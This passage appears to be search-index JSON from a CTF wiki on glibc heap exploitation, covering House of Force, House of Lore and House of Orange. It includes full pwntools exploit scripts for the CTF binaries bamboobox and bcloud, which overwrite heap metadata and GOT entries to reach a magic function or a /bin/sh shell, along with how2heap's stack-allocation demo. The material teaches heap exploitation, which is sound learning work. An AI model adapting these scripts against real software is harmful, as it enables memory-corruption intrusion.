examples, we will find that the utilization requirements of HOF are still quite demanding. First, a vulnerability is required to allow the user to control the size field of the top chunk. Secondly, requires the user to freely control the allocation size of malloc Third, the number of allocations cannot be restricted In fact, the second of these three points is often the most difficult. In the CTF topic, the size limit of the heap block is often allocated to the user, and the maximum and maximum values cannot be utilized by the HOF method.","title":"\u5c0f\u8ff0"},{"location":"pwn/linux/glibc-heap/house_of_force/#hitcon-training-lab-11","text":"[Topic link] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/hitcontraning_lab11 ) Here, we mainly modify its magic function to","title":"HITCON training lab 11"},{"location":"pwn/linux/glibc-heap/house_of_force/#basic-information","text":"\u279c hitcontraning_lab11 git: ( master ) file bamboobox bamboobox: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped \u279c hitcontraning_lab11 git: ( master ) checksec bamboobox [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) The program is a 64-bit dynamic linker.","title":"Basic Information"},{"location":"pwn/linux/glibc-heap/house_of_force/#basic-skills","text":"It should be noted that the program starts with 0x10 memory and is used to retain two function pointers . The program probably adds and removes items from the box. Show the contents of the box, and then the name of each item in the box. Add items to the box, and apply the corresponding memory for each item according to the size of the user input, as the space for storing the name. However, it should be noted that the read name is the read function, the read length parameter is the user input v2, and the read third parameter is the unsigned integer. If we enter a negative number, we can read it. Any length. But we need to make sure that the value satisfies the constraint of REQUEST_OUT_OF_RANGE , so there is a vulnerability of any length heap overflow . But even then, the first time is more difficult to use, because the size of the top chunk of the heap is generally not very large. Modify the name of the item, and read the specified length name from the specified index item according to the given index and size. The length here is read by the user, and there is also a vulnerability of any length heap overflow . Delete the item, set the size of the corresponding item to 0, and set the corresponding content to NULL. In addition, since the program is mainly a demo program, there is a magic function in the program that can directly read the flag.","title":"basic skills"},{"location":"pwn/linux/glibc-heap/house_of_force/#use","text":"Since there is a magic function in the program, our core purpose is to override a pointer to a magic function. Here, the program applies a block of memory to store two function pointers at the beginning, hello_message is used at the beginning of the program, and goodbye_message is used at the end of the program, so we can override the program execution flow by overriding goodbye_message. The specific ideas are as follows Add an item and use a heap overflow vulnerability to overwrite the top chunk to a size of -1, which is the 64-bit maximum. Use the house of force technique to assign the chunk to the base address of the heap. Override goodbye_message as the magic function address to control the program execution flow It should be noted here that when triggering the top chunk to move to the specified location, the size should be appropriate to set the new top chunk size so that the detection of the next top chunk can be bypassed. Exp is as follows #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './bamboobox' ) context.log_level = 'debug' def additem ( length, name ) : r.recvuntil ( \":\" ) r.sendline ( \"2\" ) r.recvuntil ( \":\" ) r.sendline ( str ( length )) r.recvuntil ( \":\" ) r.sendline ( name ) def modify ( idx, length, name ) : r.recvuntil ( \":\" ) r.sendline ( \"3\" ) r.recvuntil ( \":\" ) r.sendline ( str ( idx )) r.recvuntil ( \":\" ) r.sendline ( str ( length )) r.recvuntil ( \":\" ) r.sendline ( name ) def remove ( idx ) : r.recvuntil ( \":\" ) r.sendline ( \"4\" ) r.recvuntil ( \":\" ) r.sendline ( str ( idx )) def show () : r.recvuntil ( \":\" ) r.sendline ( \"1\" ) magic = 0x400d49 # we must alloc enough size, so as to successfully alloc from fake topchunk additem ( 0x30, \"ddaa\" ) # idx 0 payload = 0x30 * 'a' # idx 0's content payload += 'a' * 8 + p64 ( 0xffffffffffffffff ) # top chunk's prev_size and size # modify topchunk's size to -1 modify ( 0 , 0x41, payload ) # top chunk's offset to heap base offset_to_heap_base = - ( 0x40 + 0x20 ) malloc_size = offset_to_heap_base - 0x8 - 0xf #gdb.attach(r) additem ( malloc_size, \"dada\" ) additem ( 0x10, p64 ( magic ) * 2 ) print r.recv () r.interactive () Of course, this problem can also be done using the unlink method.","title":"Use"},{"location":"pwn/linux/glibc-heap/house_of_force/#2016-bctf-bcloud","text":"[Topic link] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/2016_bctf_bcloud )","title":"2016 BCTF bcloud"},{"location":"pwn/linux/glibc-heap/house_of_force/#basic-information_1","text":"\u279c 2016_bctf_bcloud git: ( master ) file bcloud bcloud: ELF 32 -bit LSB executable, Intel 80386 , version 1 ( SYSV ) , dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2 .6.24, BuildID [ sha1 ]= 96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped \u279c 2016_bctf_bcloud git: ( master ) checksec bcloud [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) It can be seen that this is a dynamically linked 32-bit program that primarily enables Canary protection and NX protection.","title":"Basic Information"},{"location":"pwn/linux/glibc-heap/house_of_force/#basic-skills_1","text":"The program is probably a cloud note management system. First, the program will do some initialization, set the user's name, organization, host. The program mainly has the following functions Create a new note and apply x+4 space as the size of the note based on the user's input x. Show the note, no function. . Edit the note and edit the corresponding content according to the note specified by the user. Delete the note and delete the corresponding note. Synchronize the note and mark all the notes have been synchronized. However, no flaws were found in these five functions, and the program was revisited. As a result, it was found that the program was vulnerable when it was initialized. . Initial name unsigned int init_name () { char s ; // [esp+1Ch] [ebp-5Ch] char * tmp ; // [esp+5Ch] [ebp-1Ch] unsigned int v3 ; // [esp+6Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); memset ( & s , 0 , 0x50u ); puts ( \"Input your name:\" ); read_str ( & s , 64 , '\\n' ); tmp = ( char * ) malloc ( 0x40u ); name = tmp ; strcpy ( tmp , & s ); info ( tmp ); return __readgsdword ( 0x14u ) ^ v3 ; } Here, if the name read by the program is 64 characters, then when the program outputs the corresponding string using the info function, the corresponding tmp pointer content is output, that is, leaks the heap address . . Vulnerabilities when initializing organization and org unsigned int init_org_host () { char s ; // [esp+1Ch] [ebp-9Ch] char * v2 ; // [esp+5Ch] [ebp-5Ch] char v3 ; // [esp+60h] [ebp-58h] char * v4 ; // [esp + A4h] [ebp-14h] unsigned int v5 ; // [esp+ACh] [ebp-Ch] v5 = __readgsdword ( 0x14u ); memset ( & s , 0 , 0x90u ); puts ( \"Org:\" ); read_str ( & s , 64 , 10 ); puts ( \"Host:\" ); read_str ( & v3 , 64 , 10 ); v4 = ( char * ) malloc ( 0x40u ); v2 = ( char * ) malloc ( 0x40u ); org = v2 ; host = v4 ; strcpy ( v4 , & amp ; v3 ); strcpy ( v2 , & s ); puts ( \"OKay! Enjoy:)\" ); return __readgsdword ( 0x14u ) ^ v5 ; } When reading into an organization, given 64 bytes, the lower address of v2 is overwritten. At the same time, we can know that v2 is a chunk adjacent to the top chunk, and v2 is just adjacent to org. Since 32-bit programs are generally used in 32-bit programs, the content stored in v2 is almost To a large extent, it is not \\x00 , so when you execute the strcpy function to copy content to v2, it is likely to overwrite the top chunk. This is where the vulnerability lies.","title":"basic skills"},{"location":"pwn/linux/glibc-heap/house_of_force/#use_1","text":"Use the vulnerability at the initialization name to leak the base address of the heap. . Use the house of force to allocate the top chunk to the global 0esize-8 of 0x0804B0A0. When the memory is applied again, it returns the memory at the noteize address, so that we can control the size of all the notes and the corresponding addresses. Modify the size of the first three notes to 16, and modify the pointer to free@got, atoni@got, atoni@got Change free@got to puts@plt. Leak the atoi address. Modify another atoi got item to the system address again to get the shell. The specific script is as follows from pwn import * context . terminal = [ 'gnome-terminal' , '-x' , 'sh' , '-c' ] if args [ 'DEBUG' ]: context . log_level = 'debug' context . binary = \"./bcloud\" bcloud = ELF ( & quot ; ./ bcloud & quot ;) if args [ 'REMOTE' ]: p = remote ( '127.0.0.1' , 7777 ) else : p = process ( \"./bcloud\" ) log . info ( 'PID: ' + str ( proc . pidof ( p )[ 0 ])) libc = ELF ( './libc.so.6' ) def offset_bin_main_arena ( idx ): word_bytes = context . word_size / 8 offset = 4 # lock offset += 4 # flags offset += word_bytes * 10 # offset fastbin offset += word_bytes * 2 # top,last_remainder offset += idx * 2 * word_bytes # idx offset -= word_bytes * 2 # bin overlap return offset def exp (): # leak heap base p . sendafter ( 'Input your name: \\n ' , 'a' * 64 ) p . recvuntil ( 'Hey ' + 'a' * 64 ) # sub name's chunk' s header heap_base = u32 ( p . recv ( 4 )) - 8 log . success ( 'heap_base: ' + hex ( heap_base )) p . sendafter ( 'Org: \\n ' , 'a' * 64 ) p . sendlineafter ( 'Host: \\n ' , p32 ( 0xffffffff )) # name,org,host, for each is (0x40+8) topchunk_addr = heap_base + ( 0x40 + 8 ) * 3 # make topchunk point to 0x0804B0A0-8 p . sendlineafter ( 'option--->>' , '1' ) notesize_addr = 0x0804B0A0 notelist_addr = 0x0804B120 targetaddr = notesize_addr - 8 offset_target_top = targetaddr - topchunk_addr # 4 for size_t, 7 for malloc_allign malloc_size = offset_target_top - 4 - 7 # plus 4 because malloc(v2 + 4); p . sendlineafter ( 'Input the length of the note content: \\n ' , str ( malloc_size - 4 )) # most likely malloc_size-4<0... if malloc_size - 4 > 0 : p . sendlineafter ( 'Input the content: \\n ' , '' ) #gdb.attach(p) # set notesize [0] = notesize [1] = notesize [2] = 16 # set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got p . sendlineafter ( 'option--->>' , '1' ) p . sendlineafter ( 'Input the length of the note content: \\n ' , str ( 1000 )) payload = p32 ( 16 ) * 3 + ( notelist_addr - notesize_addr - 12 ) * 'a' + p32 ( bcloud . got [ 'free' ]) + p32 ( bcloud . got [ 'atoi' ]) * 2 p . sendlineafter ( 'Input the content: \\n ' , payload ) # overwrite free@got with puts@plt p . sendlineafter ( 'option--->>' , '3' ) p . sendlineafter ( 'Input the id: \\n ' , str ( 0 )) p . sendlineafter ( 'Input the new content: \\n ' , p32 ( bcloud . plt [ 'puts' ])) # leak atoi addr by fake free p . sendlineafter ( 'option--->>' , '4' ) p . sendlineafter ( 'Input the id: \\n ' , str ( 1 )) atoi_addr = u32 ( p . recv ( 4 )) libc_base = atoi_addr - libc . symbols [ 'atoi' ] system_addr = libc_base + libc . symbols [ 'system' ] log . success ( 'libc base addr: ' + hex ( libc_base )) # overwrite atoi@got with system p . sendlineafter ( 'option--->>' , '3' ) p . sendlineafter ( 'Input the id: \\n ' , str ( 2 )) p . sendlineafter ( 'Input the new content: \\n ' , p32 ( system_addr )) # get shell p . sendlineafter ( 'option--->>' , '/bin/sh \\x00 ' ) p . interactive () if __name__ == \"__main__\" : exp ()","title":"Use"},{"location":"pwn/linux/glibc-heap/house_of_force/#topic","text":"2016 Boston Key Party CTF cookbook","title":"topic"},{"location":"pwn/linux/glibc-heap/house_of_lore/","text":"House of Lore \u00b6 Overview \u00b6 The House of Lore attack is closely related to the mechanism of Small Bin in Glibc heap management. House of Lore can modify the memory of any address by assigning chunks of any specified location. House of Lore takes advantage of the need to control the bk pointer of Small Bin Chunk and control the fd pointer of the chunk at the specified location. Fundamental \u00b6 If at malloc, the requested memory block is in the range of small bin, then the execution process is as follows /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if ( in_smallbin_range ( nb )) { // Get the index of the small bin idx = smallbin_index ( nb ); // Get the corresponding chunk pointer in the small bin bin = bin_at ( av , idx ); // First execute victim= last(bin) to get the last chunk of the small bin // If victim = bin , then the bin is empty. // If they are not equal, then there will be two cases if (( victim = last ( bin )) != bin ) { // In the first case, the small bin has not yet been initialized. if ( victim == 0 ) /* initialization check */ // Perform initialization to merge chunks in fast bins malloc_consolidate ( of ); // In the second case, there is a free chunk in the small bin else { // Get the second-to-last chunk in the small bin. bck = victim -> bk ; // Check if bck->fd is victim, prevent forgery if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // Set the corresponding inuse bit of victim set_inuse_bit_at_offset ( victim , nb ); // Modify the small bin list, take the last chunk of the small bin bin -> bk = bck ; bck -> fd = bin ; // If it is not main_arena, set the corresponding flag if ( av != & main_arena ) set_non_main_arena ( victim ); // Detailed inspection check_malloced_chunk ( off , victim , nb ); // Convert the requested chunk to the corresponding mem state void * p = chunk2mem ( victim ); // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } } We can see from this part below // Get the second-to-last chunk in the small bin. bck = victim -> bk ; // Check if bck->fd is victim, prevent forgery if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // Set the corresponding inuse bit of victim set_inuse_bit_at_offset ( victim , nb ); // Modify the small bin list, take the last chunk of the small bin bin -> bk = bck ; bck -> fd = bin ; If we can modify the bk of the last chunk of the small bin to specify the fake chunk of the memory address, and at the same time satisfy the detection of bck->fd != victim, then we can make the bk of the small bin just construct for us. Fake chunk. In other words, the next time we apply for the small bin, we will assign the fake chunk to the specified location. Sample Code \u00b6 #include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> void jackpot (){ puts ( \"Nice jump d00d\" ); exit ( 0 ); } int main ( int argc , char * argv []){ intptr_t * stack_buffer_1 [ 4 ] = { 0 }; intptr_t * stack_buffer_2 [ 3 ] = { 0 }; fprintf ( stderr , \" \\n Welcome to the House of Lore \\n \" ); fprintf ( stderr , \"This is a revisited version that bypass also the hardening check introduced by glibc malloc \\n \" ); fprintf ( stderr , \"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23 \\n\\n \" ); fprintf ( stderr , \"Allocating the victim chunk \\n \" ); intptr_t * victim = malloc ( 100 ); fprintf ( stderr , \"Allocated the first small chunk on the heap at %p \\n \" , victim ); // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk intptr_t * victim_chunk = victim -2 ; fprintf ( stderr , \"stack_buffer_1 at %p \\n \" , ( void * ) stack_buffer_1 ); fprintf ( stderr , \"stack_buffer_2 at %p \\n \" , ( void * ) stack_buffer_2 ); fprintf ( stderr , \"Create a fake chunk on the stack\" ); fprintf ( stderr , \"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted\" \"in second to the last malloc, which putting stack address on smallbin list \\n \" ); stack_buffer_1 [ 0 ] = 0 ; stack_buffer_1 [ 1 ] = 0 ; stack_buffer_1 [ 2 ] = victim_chunk ; fprintf ( stderr , \"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 \" \"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake \" \"chunk on stack\" ); stack_buffer_1 [ 3 ] = ( intptr_t * ) stack_buffer_2 ; stack_buffer_2 [ 2 ] = ( intptr_t * ) stack_buffer_1 ; fprintf ( stderr , \"Allocating another large chunk in order to avoid consolidating the top chunk with\" \"the small one during the free() \\n \" ); void * p5 = malloc ( 1000 ); fprintf ( stderr , \"Allocated the large chunk on the heap at %p \\n \" , p5 ); fprintf ( stderr , \"Freeing the chunk %p, it will be inserted in the unsorted bin \\n \" , victim ); free (( void * ) victim ); fprintf ( stderr , \" \\n In the unsorted bin the victim's fwd and bk pointers are nil \\n \" ); fprintf ( stderr , \"victim->fwd: %p \\n \" , ( void * ) victim [ 0 ]); fprintf ( stderr , \"victim->bk: %p \\n\\n \" , ( void * ) victim [ 1 ]); fprintf ( stderr , \"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin \\n \" ); fprintf ( stderr , \"This means that the chunk %p will be inserted in front of the SmallBin \\n \" , victim ); void * p2 = malloc ( 1200 ); fprintf ( stderr , \"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p \\n \" , p2 ); fprintf ( stderr , \"The victim chunk has been sorted and its fwd and bk pointers updated \\n \" ); fprintf ( stderr , \"victim->fwd: %p \\n \" , ( void * ) victim [ 0 ]); fprintf ( stderr , \"victim->bk: %p \\n\\n \" , ( void * ) victim [ 1 ]); //------------VULNERABILITY----------- fprintf ( stderr , \"Now emulating a vulnerability that can overwrite the victim->bk pointer \\n \" ); victim [ 1 ] = ( intptr_t ) stack_buffer_1 ; // victim->bk is pointing to stack //------------------------------------ fprintf ( stderr , \"Now allocating a chunk with size equal to the first one freed \\n \" ); fprintf ( stderr , \"This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer \\n \" ); void * p3 = malloc ( 100 ); fprintf ( stderr , \"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk \\n \" ); char * p4 = malloc ( 100 ); fprintf ( stderr , \"p4 = malloc(100) \\n \" ); fprintf ( stderr , \" \\n The fwd pointer of stack_buffer_2 has changed after the last malloc to %p \\n \" , stack_buffer_2 [ 2 ]); fprintf ( stderr , \" \\n p4 is %p and should be on the stack! \\n \" , p4 ); // this chunk will be allocated on stack intptr_t sc = ( intptr_t ) jackpot ; // Emulating our in-memory shellcode memcpy (( p4 + 40 ), & sc , 8 ); // This bypasses stack-smash detection since it jumps over the canary } The above code has been made very clear and will not be explained. But what needs to be noted is: void *p5 = malloc(1000); is to prevent merge with top_chunk after victim_chunk. free((void*)victim) , victim will be put into the unsort bin, and if the size of the next allocation is larger than this, the corresponding size will be allocated from the top chunk, and the chunk will be Remove the link to the appropriate bin. If it is smaller than this (equal returns directly), the corresponding size is cut off from the chunk, and the corresponding chunk is returned, and the rest becomes the last reminder chunk, or there is an unsorted bin. references \u00b6 https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_lore.c","title":"House of Lore"},{"location":"pwn/linux/glibc-heap/house_of_lore/#house-of-lore","text":"","title":"House of Lore"},{"location":"pwn/linux/glibc-heap/house_of_lore/#overview","text":"The House of Lore attack is closely related to the mechanism of Small Bin in Glibc heap management. House of Lore can modify the memory of any address by assigning chunks of any specified location. House of Lore takes advantage of the need to control the bk pointer of Small Bin Chunk and control the fd pointer of the chunk at the specified location.","title":"Overview"},{"location":"pwn/linux/glibc-heap/house_of_lore/#fundamental","text":"If at malloc, the requested memory block is in the range of small bin, then the execution process is as follows /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if ( in_smallbin_range ( nb )) { // Get the index of the small bin idx = smallbin_index ( nb ); // Get the corresponding chunk pointer in the small bin bin = bin_at ( av , idx ); // First execute victim= last(bin) to get the last chunk of the small bin // If victim = bin , then the bin is empty. // If they are not equal, then there will be two cases if (( victim = last ( bin )) != bin ) { // In the first case, the small bin has not yet been initialized. if ( victim == 0 ) /* initialization check */ // Perform initialization to merge chunks in fast bins malloc_consolidate ( of ); // In the second case, there is a free chunk in the small bin else { // Get the second-to-last chunk in the small bin. bck = victim -> bk ; // Check if bck->fd is victim, prevent forgery if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // Set the corresponding inuse bit of victim set_inuse_bit_at_offset ( victim , nb ); // Modify the small bin list, take the last chunk of the small bin bin -> bk = bck ; bck -> fd = bin ; // If it is not main_arena, set the corresponding flag if ( av != & main_arena ) set_non_main_arena ( victim ); // Detailed inspection check_malloced_chunk ( off , victim , nb ); // Convert the requested chunk to the corresponding mem state void * p = chunk2mem ( victim ); // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } } We can see from this part below // Get the second-to-last chunk in the small bin. bck = victim -> bk ; // Check if bck->fd is victim, prevent forgery if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // Set the corresponding inuse bit of victim set_inuse_bit_at_offset ( victim , nb ); // Modify the small bin list, take the last chunk of the small bin bin -> bk = bck ; bck -> fd = bin ; If we can modify the bk of the last chunk of the small bin to specify the fake chunk of the memory address, and at the same time satisfy the detection of bck->fd != victim, then we can make the bk of the small bin just construct for us. Fake chunk. In other words, the next time we apply for the small bin, we will assign the fake chunk to the specified location.","title":"Fundamental"},{"location":"pwn/linux/glibc-heap/house_of_lore/#sample-code","text":"#include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> void jackpot (){ puts ( \"Nice jump d00d\" ); exit ( 0 ); } int main ( int argc , char * argv []){ intptr_t * stack_buffer_1 [ 4 ] = { 0 }; intptr_t * stack_buffer_2 [ 3 ] = { 0 }; fprintf ( stderr , \" \\n Welcome to the House of Lore \\n \" ); fprintf ( stderr , \"This is a revisited version that bypass also the hardening check introduced by glibc malloc \\n \" ); fprintf ( stderr , \"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23 \\n\\n \" ); fprintf ( stderr , \"Allocating the victim chunk \\n \" ); intptr_t * victim = malloc ( 100 ); fprintf ( stderr , \"Allocated the first small chunk on the heap at %p \\n \" , victim ); // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk intptr_t * victim_chunk = victim -2 ; fprintf ( stderr , \"stack_buffer_1 at %p \\n \" , ( void * ) stack_buffer_1 ); fprintf ( stderr , \"stack_buffer_2 at %p \\n \" , ( void * ) stack_buffer_2 ); fprintf ( stderr , \"Create a fake chunk on the stack\" ); fprintf ( stderr , \"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted\" \"in second to the last malloc, which putting stack address on smallbin list \\n \" ); stack_buffer_1 [ 0 ] = 0 ; stack_buffer_1 [ 1 ] = 0 ; stack_buffer_1 [ 2 ] = victim_chunk ; fprintf ( stderr , \"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 \" \"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake \" \"chunk on stack\" ); stack_buffer_1 [ 3 ] = ( intptr_t * ) stack_buffer_2 ; stack_buffer_2 [ 2 ] = ( intptr_t * ) stack_buffer_1 ; fprintf ( stderr , \"Allocating another large chunk in order to avoid consolidating the top chunk with\" \"the small one during the free() \\n \" ); void * p5 = malloc ( 1000 ); fprintf ( stderr , \"Allocated the large chunk on the heap at %p \\n \" , p5 ); fprintf ( stderr , \"Freeing the chunk %p, it will be inserted in the unsorted bin \\n \" , victim ); free (( void * ) victim ); fprintf ( stderr , \" \\n In the unsorted bin the victim's fwd and bk pointers are nil \\n \" ); fprintf ( stderr , \"victim->fwd: %p \\n \" , ( void * ) victim [ 0 ]); fprintf ( stderr , \"victim->bk: %p \\n\\n \" , ( void * ) victim [ 1 ]); fprintf ( stderr , \"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin \\n \" ); fprintf ( stderr , \"This means that the chunk %p will be inserted in front of the SmallBin \\n \" , victim ); void * p2 = malloc ( 1200 ); fprintf ( stderr , \"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p \\n \" , p2 ); fprintf ( stderr , \"The victim chunk has been sorted and its fwd and bk pointers updated \\n \" ); fprintf ( stderr , \"victim->fwd: %p \\n \" , ( void * ) victim [ 0 ]); fprintf ( stderr , \"victim->bk: %p \\n\\n \" , ( void * ) victim [ 1 ]); //------------VULNERABILITY----------- fprintf ( stderr , \"Now emulating a vulnerability that can overwrite the victim->bk pointer \\n \" ); victim [ 1 ] = ( intptr_t ) stack_buffer_1 ; // victim->bk is pointing to stack //------------------------------------ fprintf ( stderr , \"Now allocating a chunk with size equal to the first one freed \\n \" ); fprintf ( stderr , \"This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer \\n \" ); void * p3 = malloc ( 100 ); fprintf ( stderr , \"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk \\n \" ); char * p4 = malloc ( 100 ); fprintf ( stderr , \"p4 = malloc(100) \\n \" ); fprintf ( stderr , \" \\n The fwd pointer of stack_buffer_2 has changed after the last malloc to %p \\n \" , stack_buffer_2 [ 2 ]); fprintf ( stderr , \" \\n p4 is %p and should be on the stack! \\n \" , p4 ); // this chunk will be allocated on stack intptr_t sc = ( intptr_t ) jackpot ; // Emulating our in-memory shellcode memcpy (( p4 + 40 ), & sc , 8 ); // This bypasses stack-smash detection since it jumps over the canary } The above code has been made very clear and will not be explained. But what needs to be noted is: void *p5 = malloc(1000); is to prevent merge with top_chunk after victim_chunk. free((void*)victim) , victim will be put into the unsort bin, and if the size of the next allocation is larger than this, the corresponding size will be allocated from the top chunk, and the chunk will be Remove the link to the appropriate bin. If it is smaller than this (equal returns directly), the corresponding size is cut off from the chunk, and the corresponding chunk is returned, and the rest becomes the last reminder chunk, or there is an unsorted bin.","title":"Sample Code"},{"location":"pwn/linux/glibc-heap/house_of_lore/#references","text":"https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_lore.c","title":"references"},{"location":"pwn/linux/glibc-heap/house_of_orange/","text":"House of Orange \u00b6 Introduction \u00b6 House of Orange differs from other House of XX methods in that it comes from a topic of the same name in Hitcon CTF 2016. Since this method of utilization has not appeared in the previous CTF topic, the use of a series of derivative topics that emerged later is called House of Orange. Overview \u00b6 The use of House of Orange is quite special. First, the target vulnerability is a vulnerability on the heap. But the special thing is that there is no free function or other function that releases the heap block. We know that you generally want to use heap vulnerabilities, you need to perform malloc and free operations on the heap, but you can't use the free function in House of Orange utilization, so the House of Orange core is free to exploit the exploit. Principle \u00b6 As we mentioned earlier, the core of House of Orange is to get a free unsorted bin without a free function. The principle of this operation is simply that when the top heap size of the current heap is insufficient to meet the size of the application allocation, the original top chunk will be released and placed in the unsorted bin. This can be done without the free function. Get unsorted bins. Let's take a look at the details of this process. Let's assume that the current top chunk does not meet the allocation requirements of malloc. First, the malloc call in the program will be executed into the _int_malloc function of libc.so. In the _int_malloc function, we will check whether the fastbin, small bins, unsorted bin, and large bins can meet the allocation requirements. Size issues are not met. Next, the _int_malloc function will attempt to use the top chunk, where the top chunk will not meet the allocation requirements, so the following branch will be executed. /* Otherwise, relay to handle system-dependent cases */ else { void * p = sysmalloc (nb, av); if (p != NULL && __builtin_expect (perturb_byte, 0)) alloc_perturb (p, bytes); return p; } At this point ptmalloc can not meet the user's request for heap memory operations, you need to execute sysmalloc to apply for more space to the system. But for the heap there are two distribution methods of mmap and brk, we need to make the heap expand in the form of brk, then the original top chunk will be placed in the unsorted bin. In summary, we have to implement brk to extend the top chunk, but to achieve this goal we need to bypass some checks in libc. First, the size of malloc cannot be greater than mmp_.mmap_threshold if ((unsigned long)(nb) >= (unsigned long)(mp_.mmap_threshold) && (mp_.n_mmaps < mp_.n_mmaps_max)) If the chunk size to be allocated is greater than the mmap allocation threshold, the default is 128K, and the memory block allocated by the current process using mmap() is less than the set maximum value, and the mmap() system call will be used to directly request memory from the operating system. There is a check for the top chunk size in the sysmalloc function, as follows assert((old_top == initial_top(av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse(old_top) && ((unsigned long)old_end & pagemask) == 0)); This checks the legitimacy of the top chunk. If this function is called for the first time, the top chunk may not be initialized, so the old_size may be 0. If the top chunk has already been initialized, then the size of the top chunk must be greater than or equal to MINSIZE, because the top chunk contains fencepost, so the top chunk must be larger than MINSIZE. Second, the top chunk must identify that the previous chunk is in the inuse state, and the end chunk's end address must be page-aligned. In addition, the top chunk removes the fencepost size must be smaller than the required chunk size, otherwise the top chunk will be used to split the chunk in the _int_malloc() function. Let's summarize the requirements for forged top chunk size Forged size must be aligned to the memory page size is greater than MINSIZE (0x10) size is smaller than the chunk size + MINSIZE (0x10) applied afterwards The prev inuse bit of size must be 1 After that, the original top chunk will execute _int_free and smoothly enter the unsorted bin. example \u00b6 Here is a sample program that simulates an overflow overlay to the size field of the top chunk. We tried to reduce the size to achieve the brk extension and put the original top chunk into the unsorted bin. #define fake_size 0x41 int main(void) { void * ptr; ptr = malloc (0x10); ptr = (void *) ((int) ptr + 24); *((long long*)ptr)=fake_size; // overwrite top chunk size malloc(0x60); malloc(0x60); } Here we cover the size of the top chunk as 0x41. Then apply for a heap larger than this size, which is 0x60. But when we execute this example, we find that this program can't be used successfully because the assert is not satisfied and throws an exception. [#0] 0x7ffff7a42428 \u2192 Name: __GI_raise(sig=0x6) [#1] 0x7ffff7a4402a \u2192 Name: __GI_abort() [#2] 0x7ffff7a8a2e8 \u2192 Name: __malloc_assert(assertion=0x7ffff7b9e150 \"(old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0)\", file=0x7ffff7b9ab85 \"malloc.c\", line=0x95a, function=0x7ffff7b9e998 <__func__.11509> \"sysmalloc\") [#3] 0x7ffff7a8e426 \u2192 Name: sysmalloc (nb = 0x70, av = 0x7ffff7dd1b20 <main_arena> ) The correct example \u00b6 Looking back at the conditions of the assert, we can see that the previously listed entries are satisfied except for the first one. 1. Forged size must be aligned to the memory page What is alignment to a memory page? We know that modern operating systems are memory managed in units of memory pages. The size of a typical memory page is 4 kb. Then our forged size must be aligned to this size. The size of the top chunk before the overlay is 20fe1, and it is calculated that 0x602020+0x20fe0=0x623000 is aligned for 0x1000 (4kb). 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <== top chunk 0x602030: 0x0000000000000000 0x0000000000000000 Therefore, our fake fake_size can be 0x0fe1, 0x1fe1, 0x2fe1, 0x3fe1, etc. for 4kb aligned size. However, 0x40 does not satisfy the alignment, so it cannot be utilized. #define fake_size 0x1fe1 int main(void) 